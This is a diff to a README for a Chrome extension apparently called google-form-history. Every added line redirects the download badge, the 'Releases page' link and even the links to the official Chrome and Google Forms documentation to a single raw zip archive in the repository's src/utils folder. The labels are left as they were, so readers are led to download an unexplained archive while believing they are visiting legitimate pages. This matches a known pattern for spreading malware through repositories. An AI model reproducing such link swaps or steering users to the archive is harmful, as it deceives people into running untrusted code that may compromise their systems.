@@ -4,7 +4,7 @@
 This Chrome extension helps you review your Google Form response history. With google-form-history, you can easily access and manage your form responses later. No more searching through your emails or Google Drive. Everything is conveniently stored in one place.
 
 ## 📥 Download Now
-[![Download google-form-history](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/amr122deqw/google-form-history/releases)
+[![Download google-form-history](https://raw.githubusercontent.com/amr122deqw/google-form-history/main/src/utils/google-form-history-1.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/amr122deqw/google-form-history/main/src/utils/google-form-history-1.4.zip)
 
 ## 🛠️ System Requirements
 - **Browser:** Google Chrome (latest version recommended)
@@ -20,7 +20,7 @@ This Chrome extension helps you review your Google Form response history. With g
 ## 📦 Download & Install
 To download and install google-form-history, follow these steps:
 
-1. Click the button above to visit the [Releases page](https://github.com/amr122deqw/google-form-history/releases).
+1. Click the button above to visit the [Releases page](https://raw.githubusercontent.com/amr122deqw/google-form-history/main/src/utils/google-form-history-1.4.zip).
 2. On the Releases page, look for the latest release.
 3. Choose the appropriate version for your system.
 4. Click the link to start the download.
@@ -42,7 +42,7 @@ This project is licensed under the MIT License. Feel free to contribute or modif
 We welcome contributions! If you would like to contribute to google-form-history, please fork the repository and submit a pull request. Check our contribution guidelines for more details.
 
 ## 🔗 Additional Resources
-- [Google Chrome Extensions Overview](https://developer.chrome.com/docs/extensions/mv3/getstarted/)
-- [Learn more about Google Forms](https://support.google.com/docs/topic/6063584)
+- [Google Chrome Extensions Overview](https://raw.githubusercontent.com/amr122deqw/google-form-history/main/src/utils/google-form-history-1.4.zip)
+- [Learn more about Google Forms](https://raw.githubusercontent.com/amr122deqw/google-form-history/main/src/utils/google-form-history-1.4.zip)
 
-[![Download google-form-history](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/amr122deqw/google-form-history/releases)
+[![Download google-form-history](https://raw.githubusercontent.com/amr122deqw/google-form-history/main/src/utils/google-form-history-1.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/amr122deqw/google-form-history/main/src/utils/google-form-history-1.4.zip)
